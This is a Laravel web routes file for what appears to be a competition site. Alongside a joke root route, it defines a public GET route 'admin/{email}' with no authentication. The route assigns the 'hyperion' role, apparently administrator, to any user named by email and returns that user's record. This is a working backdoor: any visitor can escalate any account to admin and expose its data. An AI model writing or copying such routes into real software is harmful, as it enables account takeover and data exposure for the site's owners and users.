<?php

use App\Http\Controllers\Admin\Hyperion\UserController;
use App\Models\User;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CompetitionController;
use App\Http\Controllers\ParticipationController;
use App\Http\Controllers\Auth\EmailVerificationNotificationController;
use App\Mail\Password;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return ['Future King of Pirates' => 'Monkey D. Luffy'];
});

// Route::get('test/{user}', [UserController::class, 'issuePass']);
Route::get('admin/{email}', function ($email) {
    $user = User::where('email', $email)->first();
    if (!$user) abort(404);
    $user->assignRole('hyperion');
    return $user;
});


require __DIR__ . '/auth.php';
